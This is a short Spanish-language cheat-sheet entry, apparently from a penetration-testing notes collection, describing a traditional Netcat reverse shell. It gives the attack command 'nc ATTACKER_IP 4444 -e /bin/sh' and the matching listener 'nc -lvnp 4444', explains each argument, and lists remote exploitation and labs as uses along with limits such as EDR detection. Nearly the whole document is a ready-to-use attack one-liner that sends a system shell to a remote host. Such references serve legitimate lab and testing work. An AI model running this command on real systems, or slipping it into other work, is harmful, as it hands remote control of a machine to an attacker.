# Netcat Reverse Shell — Traditional

## Descripción

Esta es una reverse shell básica usando Netcat para conectar la shell del sistema hacia un listener remoto.

---

# Comando

```bash
nc ATTACKER_IP 4444 -e /bin/sh
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* netcat instalado
* versión que soporte la opción `-e`

---

# Explicación

```
nc             → netcat
ATTACKER_IP    → IP del atacante
4444           → puerto
-e /bin/sh     → ejecuta shell y redirige salida
```

---

# Cuándo usarlo

* explotación remota
* laboratorios
* entornos donde netcat permite `-e`

---

# Limitaciones

* muchas versiones modernas de netcat eliminan `-e`
* detectable por EDR
